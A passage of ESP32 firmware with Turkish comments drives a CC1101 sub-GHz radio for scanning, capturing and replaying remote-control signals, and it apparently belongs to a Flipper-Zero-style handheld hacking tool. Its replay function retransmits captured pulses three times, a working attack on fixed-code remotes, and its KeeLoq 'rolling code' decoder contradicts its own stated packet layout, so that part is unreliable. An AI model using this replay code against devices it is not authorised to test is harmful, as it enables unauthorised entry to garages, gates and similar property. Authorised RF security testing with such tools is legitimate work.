// ─── CC1101 Yazılımsal SPI (Software SPI / Bit-bang) ──────
// RFID ile ortak donanımsal SPI hattından tamamen ayrıldı.
// SCK=GPIO45, MOSI=GPIO47, MISO=GPIO48  |  CS=GPIO5  |  GDO0=GPIO4

static void cc1101_select() {
    digitalWrite(PIN_CC1101_SS, LOW);
}
static void cc1101_deselect() {
    digitalWrite(PIN_CC1101_SS, HIGH);
}

// MISO düşene kadar bekle — CC1101 POWER_ON_RESET bitmeden hazır değil
static void cc1101_waitMISO() {
    uint32_t t = millis();
    while (digitalRead(PIN_CC1101_SW_MISO) == HIGH && millis() - t < 20)
        delayMicroseconds(1);
}

// SPI MODE0, MSBFIRST bit-bang transfer
static uint8_t cc1101_spiXfer(uint8_t b) {
    uint8_t result = 0;
    for (int i = 7; i >= 0; i--) {
        digitalWrite(PIN_CC1101_SW_MOSI, (b >> i) & 0x01);
        digitalWrite(PIN_CC1101_SW_SCK, HIGH);
        result = (result << 1) | digitalRead(PIN_CC1101_SW_MISO);
        digitalWrite(PIN_CC1101_SW_SCK, LOW);
    }
    return result;
}

static void cc1101_writeReg(uint8_t addr, uint8_t val) {
    cc1101_select();
    cc1101_waitMISO();
    cc1101_spiXfer(addr & 0x3F);  // write single
    cc1101_spiXfer(val);
    cc1101_deselect();
}

static uint8_t cc1101_readReg(uint8_t addr) {
    cc1101_select();
    cc1101_waitMISO();
    cc1101_spiXfer(addr | CC1101_READ_SINGLE);
    uint8_t val = cc1101_spiXfer(0x00);
    cc1101_deselect();
    return val;
}

static uint8_t cc1101_readStatus(uint8_t addr) {
    cc1101_select();
    cc1101_waitMISO();
    cc1101_spiXfer(addr | CC1101_READ_BURST);
    uint8_t val = cc1101_spiXfer(0x00);
    cc1101_deselect();
    return val;
}

static void cc1101_strobe(uint8_t cmd) {
    cc1101_select();
    cc1101_waitMISO();
    cc1101_spiXfer(cmd);
    cc1101_deselect();
}

static void cc1101_writeBurst(uint8_t addr, const uint8_t* data, uint8_t len) {
    cc1101_select();
    cc1101_waitMISO();
    cc1101_spiXfer((addr & 0x3F) | CC1101_WRITE_BURST);
    for (uint8_t i = 0; i < len; i++) cc1101_spiXfer(data[i]);
    cc1101_deselect();
}

static void cc1101_readBurst(uint8_t addr, uint8_t* data, uint8_t len) {
    cc1101_select();
    cc1101_waitMISO();
    cc1101_spiXfer(addr | CC1101_READ_BURST);
    for (uint8_t i = 0; i < len; i++) data[i] = cc1101_spiXfer(0x00);
    cc1101_deselect();
}

// ─── Frekans ayarı ────────────────────────────────────────
// CC1101 frekans = Fosc * FREQ / 2^16, Fosc=26MHz
static void cc1101_setFrequency(float mhz) {
    uint32_t reg = (uint32_t)((mhz * 1000000.0f / 26000000.0f) * 65536.0f);
    cc1101_writeReg(CC1101_FREQ2, (reg >> 16) & 0xFF);
    cc1101_writeReg(CC1101_FREQ1, (reg >>  8) & 0xFF);
    cc1101_writeReg(CC1101_FREQ0,  reg        & 0xFF);
    g_cc1101Freq = mhz;
}

// ─── CC1101 Reset & Init ──────────────────────────────────
static bool cc1101_init() {
    // SPI bus: RFID ile paylaşımlı.
    // g_spiInited RFID modülünde tanımlıdır (RFID bölümünden sonra).
    // CC1101 kendi bayrağını kullanır; RFID başlatmışsa tekrar begin() çağırmaz.
    // SPI.begin() is now handled globally in setup() // CS'i manuel yönet
    if (!g_cc1101SpiInited) {
        g_cc1101SpiInited = true;
    }

    // ─── Software SPI pinlerini başlat ────────────────────────
    // RFID ve SD Kart artık tamamen farklı hatlarda, CC1101
    // için donanımsal SPI yerine bit-bang kullanıyoruz.
    pinMode(PIN_CC1101_SW_SCK,  OUTPUT); digitalWrite(PIN_CC1101_SW_SCK,  LOW);
    pinMode(PIN_CC1101_SW_MOSI, OUTPUT); digitalWrite(PIN_CC1101_SW_MOSI, LOW);
    pinMode(PIN_CC1101_SW_MISO, INPUT);
    // ──────────────────────────────────────────────────────────

    pinMode(PIN_CC1101_SS,   OUTPUT);
    pinMode(PIN_CC1101_GDO0, INPUT);
    cc1101_deselect();
    delay(10);

    // Power-on reset sequence (CC1101 datasheet §10.1)
    cc1101_select();
    delayMicroseconds(10);
    cc1101_deselect();
    delayMicroseconds(40);
    cc1101_select();
    cc1101_waitMISO();
    cc1101_spiXfer(CC1101_SRES);
    cc1101_waitMISO();
    cc1101_deselect();
    delay(10);

    // Sürüm kaydı oku ve logla — artık kısıtlama YOK.
    // Her modülün kendi izole SPI hattı var, okunan değer
    // kesinlikle CC1101'e ait. 0x14=orijinal, 0x04/0x05/0x07=klon.
    uint8_t ver = cc1101_readStatus(CC1101_VERSION);
    logPush("[CC1101] VERSION=0x" + String(ver, HEX));

    // Gerçek doğrulama: register yaz → geri oku (loopback testi)
    // FSCTRL1'e bilinen bir değer yaz, oku — eşleşmiyorsa modül yok
    cc1101_writeReg(CC1101_FSCTRL1, 0x06);
    uint8_t readback = cc1101_readReg(CC1101_FSCTRL1);
    if (readback != 0x06) {
        logPush("[CC1101] Loopback fail (got 0x" + String(readback, HEX) + ") - check wiring");
        return false;
    }
    logPush("[CC1101] Loopback OK");

    // ── Temel register yapılandırması ──
    // GDO0: senkron CLK (veri alındığında sinyal verir)
    cc1101_writeReg(CC1101_IOCFG0,  0x0D);  // GDO0: carrier sense
    cc1101_writeReg(CC1101_FIFOTHR, 0x47);  // RX FIFO threshold=32 bytes
    cc1101_writeReg(CC1101_PKTCTRL0,0x32);  // infinite packet length, no CRC
    cc1101_writeReg(CC1101_PKTCTRL1,0x04);  // no status append
    cc1101_writeReg(CC1101_MCSM0,   0x18);  // FS_AUTOCAL on IDLE→RX/TX
    cc1101_writeReg(CC1101_MCSM1,   0x00);  // stay in IDLE after RX/TX

    // Frekans kalibrasyonu
    cc1101_writeReg(CC1101_FSCAL3,  0xEA);
    cc1101_writeReg(CC1101_FSCAL2,  0x2A);
    cc1101_writeReg(CC1101_FSCAL1,  0x00);
    cc1101_writeReg(CC1101_FSCAL0,  0x1F);
    cc1101_writeReg(CC1101_TEST2,   0x81);
    cc1101_writeReg(CC1101_TEST1,   0x35);
    cc1101_writeReg(CC1101_TEST0,   0x09);

    // AGC
    cc1101_writeReg(CC1101_AGCCTRL2,0x43);
    cc1101_writeReg(CC1101_AGCCTRL1,0x40);
    cc1101_writeReg(CC1101_AGCCTRL0,0x91);

    // PA güç tablosu — yaklaşık +10dBm (433 MHz)
    uint8_t paTable[8] = {0x00, g_cc1101Power, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    cc1101_writeBurst(CC1101_PATABLE, paTable, 8);

    // Varsayılan frekans ve mod
    cc1101_setFrequency(g_cc1101Freq);
    g_cc1101Inited = true;
    logPush("[CC1101] Init OK ver=0x" + String(ver, HEX) + " f=" + String(g_cc1101Freq) + "MHz");
    return true;
}

// ─── Modülasyon yapılandırması ────────────────────────────
static void cc1101_setModulation(CC1101Mod mod) {
    uint8_t mdmcfg2 = cc1101_readReg(CC1101_MDMCFG2);
    mdmcfg2 = (mdmcfg2 & 0x8F) | (uint8_t)mod;
    cc1101_writeReg(CC1101_MDMCFG2, mdmcfg2);
    g_cc1101Mod = mod;

    // Modülasyona göre ek ayarlar
    switch (mod) {
        case CC_MOD_ASKOOK:
            // OOK: PA tablosunda 0x00 ve güç değeri
            cc1101_writeReg(CC1101_FREND0, 0x11);  // PA_POWER=1 (PATABLE[0] ve [1])
            cc1101_writeReg(CC1101_AGCCTRL2, 0x43);
            break;
        case CC_MOD_GFSK:
            cc1101_writeReg(CC1101_DEVIATN, 0x47);  // ±47kHz
            cc1101_writeReg(CC1101_FREND0,  0x10);
            break;
        case CC_MOD_2FSK:
            cc1101_writeReg(CC1101_DEVIATN, 0x47);
            cc1101_writeReg(CC1101_FREND0,  0x10);
            break;
        case CC_MOD_4FSK:
            cc1101_writeReg(CC1101_DEVIATN, 0x45);
            cc1101_writeReg(CC1101_FREND0,  0x10);
            break;
        case CC_MOD_MSK:
            cc1101_writeReg(CC1101_DEVIATN, 0x00);
            cc1101_writeReg(CC1101_FREND0,  0x10);
            break;
    }
}

// ─── Veri hızı ayarı ──────────────────────────────────────
// Hedef baud: 1200, 2400, 4800, 9600, 38400, 115200
static void cc1101_setBaudRate(uint32_t baud) {
    // DRATE = Fosc * (256+DRATE_M) * 2^DRATE_E / 2^28
    // Önceden hesaplanmış değerler:
    uint8_t m, e;
    if      (baud <= 1200)   { m = 0x83; e = 0x05; }  // ~1200
    else if (baud <= 2400)   { m = 0x83; e = 0x06; }  // ~2400
    else if (baud <= 4800)   { m = 0x83; e = 0x07; }  // ~4800
    else if (baud <= 9600)   { m = 0x83; e = 0x08; }  // ~9600
    else if (baud <= 38400)  { m = 0x83; e = 0x0A; }  // ~38400
    else                     { m = 0x22; e = 0x0D; }  // ~115200
    cc1101_writeReg(CC1101_MDMCFG4, (e & 0x0F) | 0xF0);  // CHANBW_E=3, CHANBW_M=3
    cc1101_writeReg(CC1101_MDMCFG3, m);
}

// ─── RSSI okuma ───────────────────────────────────────────
static int8_t cc1101_getRSSI() {
    uint8_t raw = cc1101_readStatus(CC1101_RSSI);
    int8_t rssi;
    if (raw >= 128) rssi = (int8_t)((int16_t)raw - 256) / 2 - 74;
    else            rssi = (int8_t)raw / 2 - 74;
    return rssi;
}

// ─── Kanal boş mu? (Carrier Sense) ───────────────────────
static bool cc1101_channelFree() {
    return (digitalRead(PIN_CC1101_GDO0) == LOW);
}

// ─── Veri gönder (OOK/ASK pulse burst) ───────────────────
static void cc1101_sendPulses(const RFPulse* pulses, uint16_t count) {
    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_SFTX);
    // GDO0 → data clock output için IOCFG0=0x0B (serial clock) konfigürasyonu,
    // Manuel OOK: GDO0'u değil, TX FIFO'yu zaman bazlı doldur
    // CC1101'i TX moduna al, GDO2 yerine doğrudan GPIO ile OOK sürücüsü:
    cc1101_writeReg(CC1101_IOCFG0, 0x2E);  // GDO0: tri-state (güvenli)
    cc1101_strobe(CC1101_STX);
    delayMicroseconds(150);
    // Pulse-by-pulse manuel kontrol (OOK için PA on/off)
    for (uint16_t i = 0; i < count; i++) {
        uint8_t paVal[2];
        if (pulses[i].level) {
            // TX: PA açık
            paVal[0] = 0x00; paVal[1] = g_cc1101Power;
        } else {
            // TX: PA kapalı (OOK "0")
            paVal[0] = 0x00; paVal[1] = 0x00;
        }
        cc1101_writeBurst(CC1101_PATABLE, paVal, 2);
        delayMicroseconds(pulses[i].dur);
    }
    cc1101_strobe(CC1101_SIDLE);
    // GDO0'ı normal moda geri al
    cc1101_writeReg(CC1101_IOCFG0, 0x0D);
    uint8_t paFinal[2] = {0x00, g_cc1101Power};
    cc1101_writeBurst(CC1101_PATABLE, paFinal, 2);
}

// ─── SPIFFS başlatma ──────────────────────────────────────
static bool spiffs_ensure() {
    if (g_spiffsInited) return true;
    if (!SPIFFS.begin(true)) {
        logPush("[SPIFFS] Format ediliyor...");
        SPIFFS.format();
        if (!SPIFFS.begin(true)) {
            logPush("[SPIFFS] Mount failed");
            return false;
        }
    }
    g_spiffsInited = true;
    // Capture klasörü oluştur
    if (!SPIFFS.exists("/rfcap")) {
        // SPIFFS'te klasör yoktur, dosya adlarında / kullanılır
    }
    logPush("[SPIFFS] Mounted OK");
    return true;
}

// ─── RF Capture: yakalanan pulse'ları SPIFFS'e kaydet ────
static bool rf_capture_save(const String& name) {
    if (!spiffs_ensure()) return false;
    String path = "/rfcap_" + name + ".bin";
    File f = SPIFFS.open(path, "w");
    if (!f) { logPush("[RF] Save fail: " + path); return false; }
    // Header: magic + count
    f.write((uint8_t)'R'); f.write((uint8_t)'F');
    f.write((uint8_t)'C'); f.write((uint8_t)'1');
    uint16_t cnt = g_rfCaptureLen;
    f.write((uint8_t)(cnt >> 8));
    f.write((uint8_t)(cnt & 0xFF));
    // Freq (float, 4 bytes)
    uint8_t fBytes[4]; memcpy(fBytes, &g_cc1101Freq, 4);
    f.write(fBytes, 4);
    // Pulses
    for (uint16_t i = 0; i < cnt; i++) {
        f.write((uint8_t)(g_rfCapture[i].dur >> 8));
        f.write((uint8_t)(g_rfCapture[i].dur & 0xFF));
        f.write((uint8_t)(g_rfCapture[i].level ? 1 : 0));
    }
    f.close();
    g_rfCaptureFile = path;
    logPush("[RF] Saved " + String(cnt) + " pulses → " + path);
    return true;
}

// ─── RF Capture: SPIFFS veya SD'den yükle ────────────────
// path formatı: "spiffs:/rfcap_xxx.bin"  → SPIFFS
//               "sd:/rf_captures/xxx.bin" → SD kart
static bool rf_capture_load(const String& path) {
    File f;
    bool useSD = path.startsWith("sd:");
    if (useSD) {
        if (!g_sdInited) { logPush("[RF] SD not mounted"); return false; }
        String sdPath = path.substring(3); // "sd:" kısmını at
        f = SD.open(sdPath.c_str(), FILE_READ);
    } else {
        String spiffsPath = path.startsWith("spiffs:") ? path.substring(7) : path;
        if (!spiffs_ensure()) return false;
        f = SPIFFS.open(spiffsPath, "r");
    }
    if (!f) { logPush("[RF] Load fail: " + path); return false; }
    uint8_t hdr[10];
    if (f.read(hdr, 10) < 10 || hdr[0]!='R' || hdr[1]!='F' || hdr[2]!='C' || hdr[3]!='1') {
        f.close(); logPush("[RF] Bad header: " + path); return false;
    }
    uint16_t cnt = ((uint16_t)hdr[4] << 8) | hdr[5];
    memcpy(&g_cc1101Freq, &hdr[6], 4);
    if (cnt > CC_CAPTURE_MAX) cnt = CC_CAPTURE_MAX;
    g_rfCaptureLen = 0;
    for (uint16_t i = 0; i < cnt; i++) {
        uint8_t pb[3];
        if (f.read(pb, 3) < 3) break;
        g_rfCapture[i].dur   = ((uint16_t)pb[0] << 8) | pb[1];
        g_rfCapture[i].level = pb[2] ? true : false;
        g_rfCaptureLen++;
    }
    f.close();
    g_rfCaptureFile = path;
    logPush("[RF] Loaded " + String(g_rfCaptureLen) + " pulses from " + path);
    return true;
}

// ─── RF Capture dosyalarını listele ───────────────────────
static std::vector<String> rf_capture_list() {
    std::vector<String> files;
    // SPIFFS dosyaları — prefix "spiffs:" ile işaretle
    if (spiffs_ensure()) {
        File root = SPIFFS.open("/");
        File file = root.openNextFile();
        while (file) {
            String name = String(file.name());
            if (name.startsWith("/rfcap_") || name.startsWith("rfcap_")) {
                if (!name.startsWith("/")) name = "/" + name;
                files.push_back("spiffs:" + name);
            }
            file = root.openNextFile();
        }
    }
    // SD dosyaları — prefix "sd:" ile işaretle
    if (g_sdInited) {
        File root = SD.open("/rf_captures");
        if (root && root.isDirectory()) {
            File entry = root.openNextFile();
            while (entry) {
                String name = String(entry.name());
                // name() bazen tam yol verir
                int sl = name.lastIndexOf('/');
                if (sl >= 0) name = name.substring(sl + 1);
                if (name.endsWith(".bin")) {
                    files.push_back("sd:/rf_captures/" + name);
                }
                entry = root.openNextFile();
            }
        }
    }
    return files;
}

// ─────────────────────────────────────────────────────────
//  CC1101 FONKSIYON IMPLEMENTASYONLARI
// ─────────────────────────────────────────────────────────

// Modülasyon adı — forward decl yukarıda; bu gövde tanımı.
static const char* cc1101_modName(CC1101Mod m) {
    switch ((uint8_t)m) {
        case 0x00: return "2-FSK";
        case 0x10: return "GFSK";
        case 0x30: return "ASK/OOK";
        case 0x40: return "4-FSK";
        case 0x70: return "MSK";
        default:   return "???";
    }
}

// ─── Init kontrolü (fonksiyonlar başında çağrılır) ────────
static bool cc1101_ensureInit() {
    if (g_cc1101Inited) return true;
    dispProgress("CC1101", "Initializing...", 20);
    if (!cc1101_init()) {
        dispBannerErr("CC1101 Bulunamadi!");
        logPush("[CC1101] Not found — check wiring CS=5 GDO0=4");
        return false;
    }
    return true;
}

// ─── 1. Sub-GHz RF Tarama ─────────────────────────────────
static void cc1101_scan_run() {
    if (!cc1101_ensureInit()) return;

    // Frekans seç
    OptionList freqOpts = {
        {"433.92 MHz (EU)", [](){}},
        {"315.00 MHz (US)", [](){}},
        {"868.30 MHz (EU)", [](){}},
        {"915.00 MHz (US)", [](){}},
        {"Back",            [](){}},
    };
    int fs = loopOptions(freqOpts, "RF Freq Sec");
    if (fs < 0 || fs == 4) return;
    float freqs[] = {433.92f, 315.0f, 868.3f, 915.0f};
    cc1101_setFrequency(freqs[fs]);
    cc1101_setModulation(CC_MOD_ASKOOK);

    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_SRX);

    buzzRFScan();  // Tarama başladı — kısa bip

    animSubGHzScanning(freqs[fs]);  // Flipper Zero Sub-GHz dalgalanma animasyonu

    dispClear(); dispStatusBar("RF Tarama");
    dispText(0, 13, "Frekans: " + String(g_cc1101Freq, 2) + " MHz");
    dispText(0, 25, "Mod: " + String(cc1101_modName(g_cc1101Mod)));
    dispText(0, 37, "Sinyal bekleniyor...");
    dispText(0, 55, "LONG=cik");
    dispCommit();

    uint32_t startT = millis();
    int8_t  maxRssi = -120;
    uint32_t sigCount = 0;

    while (true) {
        if (readButtonLong()) break;

        int8_t rssi = cc1101_getRSSI();
        if (rssi > maxRssi) maxRssi = rssi;

        bool sig = (rssi > -80);
        if (sig) sigCount++;

        // Her 500ms güncelle
        if (millis() - startT > 300) {
            startT = millis();
            dispClear(); dispStatusBar("RF Tarama");
            dispText(0, 13, String(g_cc1101Freq, 2) + "MHz " + cc1101_modName(g_cc1101Mod));
            dispText(0, 23, "RSSI: " + String(rssi) + " dBm");
            dispText(0, 33, "Max:  " + String(maxRssi) + " dBm");
            dispText(0, 43, "Sinyal: " + String(sigCount));
            // Basit güç çubuğu
            int bar = map(constrain(rssi, -120, -40), -120, -40, 0, OLED_W - 4);
            display.drawRect(2, 52, OLED_W-4, 6, SSD1306_WHITE);
            if (bar > 0) display.fillRect(2, 52, bar, 6, SSD1306_WHITE);
            dispCommit();
        }
        delay(50);
    }
    cc1101_strobe(CC1101_SIDLE);
    dispBannerOK("Max RSSI: " + String(maxRssi) + "dBm");
}

// ─── 2. RF Capture ────────────────────────────────────────
static void cc1101_capture_run() {
    if (!cc1101_ensureInit()) return;

    // Flipper Zero SubGhz tarama ikonu ile bekleme ekrani
    showRFScanScreen(String(g_cc1101Freq, 2).c_str());

    if (readButtonLong()) return;
    while (!readButton()) {
        if (readButtonLong()) return;
        delay(50);
    }

    cc1101_writeReg(CC1101_IOCFG0, 0x0D);  // GDO0: carrier sense
    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_SRX);
    delay(50);

    // Sinyal bekleme: SubGhz ikonu goster
    showRFScanScreen("Sinyal bekleniyor...");

    // Tasiyici tespit et -- GDO0 HIGH olana kadar bekle
    uint32_t waitT = millis();
    while (digitalRead(PIN_CC1101_GDO0) == LOW) {
        if (millis() - waitT > 8000) {
            dispBannerWarn("Zaman asimi!");
            cc1101_strobe(CC1101_SIDLE);
            return;
        }
        delay(1);
    }

    // Yakalama basladi -- DolphinMafia ikonu goster
    g_rfCaptureLen = 0;
    showOpScreen(FzOpIcon::DolphinMafia, "Capturing...", 0);

    bool     lastLevel  = HIGH;
    uint32_t lastChange = micros();
    uint32_t captureT   = millis();

    while (millis() - captureT < 2000 && g_rfCaptureLen < CC_CAPTURE_MAX - 1) {
        bool cur = (digitalRead(PIN_CC1101_GDO0) == HIGH);
        if (cur != lastLevel) {
            uint32_t now = micros();
            uint16_t dur = (uint16_t)min((uint32_t)65535, now - lastChange);
            g_rfCapture[g_rfCaptureLen++] = {dur, lastLevel};
            lastLevel  = cur;
            lastChange = now;
        }
        // Sessizlik kontrolü (>50ms = paket sonu)
        uint32_t silence = micros() - lastChange;
        if (g_rfCaptureLen > 4 && silence > 50000) break;
    }

    cc1101_strobe(CC1101_SIDLE);

    if (g_rfCaptureLen < 4) {
        dispBannerWarn("Cok az veri!");
        return;
    }

    dispClear(); dispStatusBar("RF Capture");
    dispText(0, 14, "Yakalandi: " + String(g_rfCaptureLen) + " pulse");

    // Dosya adı için timestamp
    String fname = "sig_" + String(millis() / 1000);
    dispText(0, 26, "Kaydediliyor...");
    dispCommit();

    bool spiffsSaved = rf_capture_save(fname);

    // SD'ye paralel kayıt — SPIFFS ile aynı binary format
    bool sdSaved = false;
    if (g_sdInited) {
        String sdPath = "/rf_captures/" + fname + ".bin";
        File sdF = SD.open(sdPath.c_str(), FILE_WRITE);
        if (sdF) {
            // Header: magic RFC1 + count (2B) + freq (4B)
            sdF.write((uint8_t)'R'); sdF.write((uint8_t)'F');
            sdF.write((uint8_t)'C'); sdF.write((uint8_t)'1');
            sdF.write((uint8_t)(g_rfCaptureLen >> 8));
            sdF.write((uint8_t)(g_rfCaptureLen & 0xFF));
            uint8_t fBytes[4]; memcpy(fBytes, &g_cc1101Freq, 4);
            sdF.write(fBytes, 4);
            for (uint16_t i = 0; i < g_rfCaptureLen; i++) {
                sdF.write((uint8_t)(g_rfCapture[i].dur >> 8));
                sdF.write((uint8_t)(g_rfCapture[i].dur & 0xFF));
                sdF.write((uint8_t)(g_rfCapture[i].level ? 1 : 0));
            }
            sdF.close();
            sdSaved = true;
            sdLog("[CC1101] cap=" + sdPath + " freq=" + String(g_cc1101Freq, 3)
                  + " pulses=" + String(g_rfCaptureLen));
            logPush("[RF] SD cap saved: " + sdPath);
        } else {
            logPush("[RF] SD cap open fail: " + sdPath);
        }
    }

    if (spiffsSaved || sdSaved) {
        buzzRFCapture();
        g_xpRfCnt++;
        xpAdd(XP_PER_RF_CAP);
        String where = spiffsSaved ? "SPIFFS" : "";
        if (sdSaved) { if (where.length()) where += "+"; where += "SD"; }
        dispBannerOK("Kaydedildi(" + where + "): " + fname);
        logPush("[RF] Capture saved: " + fname + " pulses=" + String(g_rfCaptureLen));
    } else {
        dispBannerErr("Kayit hatasi!");
    }
}

// ─── 3. RF Replay ─────────────────────────────────────────
static void cc1101_replay_run() {
    if (!cc1101_ensureInit()) return;

    if (!spiffs_ensure()) {
        dispBannerErr("SPIFFS hatasi!");
        return;
    }

    std::vector<String> files = rf_capture_list();
    if (files.empty()) {
        dispBannerWarn("Kayitli sinyal yok!");
        return;
    }

    OptionList fileOpts;
    for (auto& f : files) {
        String shortName = f;
        // "spiffs:/rfcap_" → "[S]" prefix ile göster
        // "sd:/rf_captures/" → "[D]" prefix ile göster
        if (shortName.startsWith("spiffs:")) {
            shortName = "[S]" + shortName.substring(shortName.lastIndexOf('/') + 1);
        } else if (shortName.startsWith("sd:")) {
            shortName = "[D]" + shortName.substring(shortName.lastIndexOf('/') + 1);
        }
        // .bin uzantısını kaldır
        if (shortName.endsWith(".bin")) shortName = shortName.substring(0, shortName.length() - 4);
        if (shortName.length() > 17) shortName = shortName.substring(0, 16) + "~";
        fileOpts.push_back({shortName, [](){}});
    }
    fileOpts.push_back({"Back", [](){}});

    int sel = loopOptions(fileOpts, "RF Replay");
    if (sel < 0 || sel == (int)fileOpts.size()-1) return;

    dispProgress("RF Replay", "Yukleniyor...", 30);
    if (!rf_capture_load(files[sel])) {
        dispBannerErr("Yuklenemedi!");
        return;
    }

    dispClear(); dispStatusBar("RF Replay");
    dispText(0, 14, "Dosya: " + files[sel].substring(0,16));
    dispText(0, 24, "Pulse: " + String(g_rfCaptureLen));
    dispText(0, 34, "Frek: " + String(g_cc1101Freq,2) + "MHz");
    dispText(0, 44, "BTN=gonder  LONG=cik");
    dispCommit();

    while (true) {
        if (readButtonLong()) break;
        if (readButton()) {
            showOpScreen(FzOpIcon::DolphinMafia, "Sending...", 0);
            dispCommit();

            cc1101_setModulation(CC_MOD_ASKOOK);
            cc1101_setFrequency(g_cc1101Freq);
            // 3 kez gönder (rolling code olmayan sinyaller için)
            for (int rep = 0; rep < 3; rep++) {
                cc1101_sendPulses(g_rfCapture, g_rfCaptureLen);
                delay(20);
            }
            cc1101_strobe(CC1101_SIDLE);
            buzzRFReplay();  // Gönderildi — iki bip + uzun
            g_xpRfCnt++;
            g_xpSubReplCnt++;
            xpAdd(XP_PER_RF_REPLY);
            dispBannerOK("Gonderildi! (x3)");
            logPush("[RF] Replay sent: " + files[sel] + " x3");
        }
        delay(50);
    }
}

// ─── 4. Rolling Code Analiz ───────────────────────────────
// HCS300/HCS301 benzeri KeeLoq rolling code basit analizi
// Gerçek şifre çözme donanım anahtarı gerektirir;
// bu araç bitstream ve istatistik gösterir
static void cc1101_rollingcode_run() {
    if (!cc1101_ensureInit()) return;

    dispClear(); dispStatusBar("Rolling Code");
    dispText(0, 14, "Frek: " + String(g_cc1101Freq, 2) + "MHz");
    dispText(0, 26, "HCS300/301 tipi analiz");
    dispText(0, 38, "BTN=basla  LONG=cik");
    dispCommit();
    while (!readButton()) {
        if (readButtonLong()) return;
        delay(50);
    }

    // Yakalama modunu kullan
    cc1101_writeReg(CC1101_IOCFG0, 0x0D);
    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_SRX);

    dispClear(); dispStatusBar("Rolling Code");
    dispText(0, 22, "Kumanda bekle...");
    dispCommit();

    uint32_t waitT = millis();
    while (digitalRead(PIN_CC1101_GDO0) == LOW) {
        if (millis() - waitT > 10000) { dispBannerWarn("Zaman asimi!"); return; }
        delay(1);
    }

    // Pulse yakala
    g_rfCaptureLen = 0;
    bool lastLvl = HIGH;
    uint32_t lastUs = micros();
    uint32_t cT = millis();
    while (millis() - cT < 1500 && g_rfCaptureLen < CC_CAPTURE_MAX - 1) {
        bool cur = (digitalRead(PIN_CC1101_GDO0) == HIGH);
        if (cur != lastLvl) {
            uint32_t now = micros();
            g_rfCapture[g_rfCaptureLen++] = {(uint16_t)(now - lastUs), lastLvl};
            lastLvl = cur; lastUs = now;
        }
        if (g_rfCaptureLen > 4 && micros() - lastUs > 40000) break;
    }
    cc1101_strobe(CC1101_SIDLE);

    if (g_rfCaptureLen < 12) {
        dispBannerWarn("Cok kisa paket!");
        return;
    }

    // Bit çözme — Manchester veya PWM kodlaması tespiti
    // Puls genişliği ölçüm istatistiği
    uint32_t shortPulse = 0xFFFFFFFF, longPulse = 0;
    for (uint16_t i = 0; i < g_rfCaptureLen; i++) {
        if (g_rfCapture[i].dur < shortPulse) shortPulse = g_rfCapture[i].dur;
        if (g_rfCapture[i].dur > longPulse)  longPulse  = g_rfCapture[i].dur;
    }
    uint32_t threshold = (shortPulse + longPulse) / 2;

    // Bitlere çevir
    uint32_t bits = 0; uint8_t bitCnt = 0;
    for (uint16_t i = 0; i < g_rfCaptureLen && bitCnt < 32; i++) {
        uint8_t bit = (g_rfCapture[i].dur > threshold) ? 1 : 0;
        bits = (bits << 1) | bit;
        bitCnt++;
    }

    // HCS300 benzeri paket yorumla:
    // [preamble 12bit][serino 28bit][button 4bit][counter 16bit][encryption 32bit]
    g_rcPacket.rawBits  = bits;
    g_rcPacket.bitCount = bitCnt;
    g_rcPacket.button   = (bits >> 28) & 0x0F;
    g_rcPacket.serial   = (bits >> 4)  & 0x0FFFFFFF;
    g_rcPacket.counter  = bits & 0x0F;
    g_rcPacket.valid    = (bitCnt >= 24);

    g_xpRollingCnt++;
    xpAdd(XP_PER_ROLLINGCODE);
    dispClear(); dispStatusBar("Rolling Code");
    dispText(0, 12, "Pulse: " + String(g_rfCaptureLen));
    dispText(0, 22, "Bits:  " + String(bitCnt));
    dispText(0, 32, "Buton: " + String(g_rcPacket.button, HEX));
    dispText(0, 42, "Seri:  " + String(g_rcPacket.serial, HEX));
    dispText(0, 52, "Raw: " + String(bits, BIN).substring(0,14) + "...");
    dispCommit();
    delay(4000);

    // Detay menüsü
    OptionList detOpts = {
        {"Tekrar Yakala",  []() { cc1101_rollingcode_run(); }},
        {"SPIFFS Kaydet",  []() {
            rf_capture_save("rc_" + String(millis()/1000));
            dispBannerOK("Kaydedildi!");
        }},
        {"Back",           []() { backToMenu(); }},
    };
    int sel = loopOptions(detOpts, "RC Analiz");
    if (sel >= 0 && sel < (int)detOpts.size()) detOpts[sel].action();
    logPush("[RC] bits=" + String(bitCnt) + " raw=0x" + String(bits, HEX));
}

// ─── 5. Modülasyon Seçici ve Test ────────────────────────
static void cc1101_modulation_run() {
    if (!cc1101_ensureInit()) return;

    OptionList modOpts = {
        {"ASK/OOK",      [](){}},
        {"2-FSK",        [](){}},
        {"GFSK",         [](){}},
        {"4-FSK",        [](){}},
        {"MSK",          [](){}},
        {"Back",         [](){}},
    };
    int ms = loopOptions(modOpts, "Modulasyon Sec");
    if (ms < 0 || ms == 5) return;

    CC1101Mod mods[] = {CC_MOD_ASKOOK, CC_MOD_2FSK, CC_MOD_GFSK, CC_MOD_4FSK, CC_MOD_MSK};
    cc1101_setModulation(mods[ms]);

    // Baud hızı seç
    OptionList baudOpts = {
        {"1200 baud",  [](){}},
        {"2400 baud",  [](){}},
        {"4800 baud",  [](){}},
        {"9600 baud",  [](){}},
        {"38400 baud", [](){}},
        {"Back",       [](){}},
    };
    int bs = loopOptions(baudOpts, "Baud Sec");
    if (bs < 0 || bs == 5) return;
    uint32_t bauds[] = {1200, 2400, 4800, 9600, 38400};
    cc1101_setBaudRate(bauds[bs]);

    // Sinyal testi — RX tarama
    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_SRX);

    dispClear(); dispStatusBar("RF Mod Test");
    dispText(0, 13, cc1101_modName(mods[ms]));
    dispText(0, 24, String(bauds[bs]) + " baud");
    dispText(0, 35, "RSSI izleniyor...");
    dispText(0, 55, "LONG=cik");
    dispCommit();

    uint32_t tRef = millis();
    while (!readButtonLong()) {
        if (millis() - tRef > 400) {
            tRef = millis();
            int8_t r = cc1101_getRSSI();
            dispClear(); dispStatusBar("RF Mod Test");
            dispText(0, 12, String(cc1101_modName(mods[ms])) + " " + String(bauds[bs]) + "bd");
            dispText(0, 24, "RSSI: " + String(r) + " dBm");
            int bar = map(constrain(r, -120, -40), -120, -40, 0, OLED_W-4);
            display.drawRect(2, 34, OLED_W-4, 8, SSD1306_WHITE);
